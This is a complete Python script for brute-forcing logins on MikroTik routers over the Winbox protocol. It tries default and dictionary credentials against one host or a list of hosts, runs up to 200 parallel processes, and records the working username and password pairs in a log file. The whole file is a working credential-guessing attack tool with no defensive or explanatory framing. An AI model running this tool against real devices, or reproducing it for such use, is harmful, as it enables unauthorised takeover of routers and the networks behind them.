#!/usr/bin/env python3

import argparse, binascii, struct, socket, hashlib, time
from multiprocessing import Pool

# https://github.com/jabberd/winbox
from winbox.session import *

results_filename = 'dude-brute.log'

# Authorization result codes
AUTH_GOOD  = 0
AUTH_BAD   = 1
AUTH_ERROR = 2
AUTH_RESULT_CODES = ["GOOD", "BAD", "ERROR"]

TIMEOUT = 5
SLEEP_TIME = 0.5
DEFAULT_CREDS = ('admin', '')
DEBUG = False

# Global variables
targets = []
creds = []
number_of_threads = 200
winbox_port = 8291
stop_after_good = False
log = False

# Try to login using winbox and return the result
def winbox_login(host, user, password):
	try:
		w = mtWinboxSession(host.encode(), int(winbox_port), timeout = TIMEOUT)
		try:
			if w.login_cleartext(user.encode(), password.encode()):
				print('\033[32m[+] %s %s %s [GOOD]\033[39m' % (host, user, password))
				result = AUTH_GOOD
			else:
				print('[-] %s %s %s [BAD]' % (host, user, password))
				result = AUTH_BAD
		except:
			print('[-] %s %s %s [ERROR]' % (host, user, password))
			result = AUTH_ERROR
	except:
		print('[-] %s %s %s [ERROR]' % (host, user, password))
		result = AUTH_ERROR
	try:
		w.close()
	except:
		pass
	time.sleep(SLEEP_TIME)
	return result

def bruteforce(target):
	result = []
	for u, p in creds:
		print('[*] Trying to connect to target: %s (%s:%s)' % (target, u, p))
		code = winbox_login(target, u, p)
		result.append((target, u, p, code))
		if code == AUTH_GOOD:
			if stop_after_good:
				return result
		if code == AUTH_ERROR:
			break
	return result

def read_dictionary(filename):
	try:
		with open(filename) as f:
			dictionary = [d.strip() for d in f.readlines()]
		f.close()
		return dictionary
	except:
		return None

def parse_dictionary(dict):
	result = []
	for d in dict:
		try:
			login, password = d.split('\t')
		except:
			login = d
			password = ''
		result.append((login, password))
	return result

def read_targets(filename):
	try:
		with open(filename) as f:
			targets = [t.strip() for t in f.readlines()]
		f.close()
		return targets
	except:
		return None

def parse_args():
	parser = argparse.ArgumentParser(description='description')
	parser.add_argument('-d', '--dict', help = 'A dictionary file', required = False)
	parser.add_argument('-t', '--target', help = 'Single target hostname', required = False)
	parser.add_argument('-T', '--targets', help = 'Targets list filename', required = False)
	parser.add_argument('-n', '--threads', type = int, help = 'Number of threads for parallel processing', required = False)
	parser.add_argument('-p', '--port', type = int, help = 'Winbox port number', required = False)
	parser.add_argument('-S', '--stop-after-good', action = 'store_true', help = 'Stop login tries after good creds found for the target', required = False)
	parser.add_argument('--log', help = 'Write log file', required = False)
	parser.add_argument('--default', action = 'store_true', help = 'Try default credentials at first', required = False)
	parser.add_argument('--debug', action = 'store_true', help = 'Debug mode', required = False)
	return vars(parser.parse_args())

if __name__ == '__main__':
	results_file_opened = False
	args = parse_args()

	if not ((args['target'] or args['targets']) and (args['dict'] or args['default'])):
		print('Please specify --target/-t <hostname> or --targets/-T <filename> to scan, and --dict/-d <filename> and/or --default')
		exit(1)

	if args['dict']:
		dictfile = args['dict']
		dict = read_dictionary(dictfile)
		if dict is None:
			print('Error reading the dictionary file: %s' % dictfile)
			exit(1)
		creds = parse_dictionary(dict)
		if args['default']:
			creds.insert(0, DEFAULT_CREDS)

	if args['debug']:
		DEBUG = True

	if args['default']:
		if not args['dict']:
			creds = [DEFAULT_CREDS]

	if args['threads']:
		number_of_threads = args['threads']

	if args['port']:
		winbox_port = args['port']

	if args['target'] and args['targets']:
		print('Please specify either --target/-t <hostname>, or --targets/-T <filename>, but not both')
		exit(1)
	elif args['target']:
		targets.append(args['target'])
		number_of_threads = 1
	else:
		targetsfile = args['targets']
		targets = read_targets(targetsfile)
		if targets is None:
			print('Error reading the targets file: %s' % targetsfile)
			exit(1)
		targets_count = len(targets)
		if targets_count < number_of_threads:
			number_of_threads = targets_count

	if args['stop_after_good']:
		stop_after_good = True

	if args['log']:
		log = True
		log_filename = args['log']
		log_file = open(log_filename, 'a')

	print('[*] Starting with %s threads' % number_of_threads)
	pool = Pool(processes = int(number_of_threads))
	results = pool.map(bruteforce, targets)
	pool.close()
	pool.join()
	print('[!] Finishing...')

	print('\nGood results:\n=============')
	for r in results:
		for e in r:
			host, login, password, code = e
			if code == AUTH_GOOD:
				out = host + '\t' + login + '\t' + password
				print(out)
				if not results_file_opened:
					results_file = open(results_filename, 'a')
					results_file_opened = True
				results_file.write(out + '\n')
			if log:
				log_file.write(AUTH_RESULT_CODES[code] + '\t' + host + '\t' + login + '\t' + password + '\n')

	if results_file_opened:
		results_file.close()
	if log:
		log_file.close()
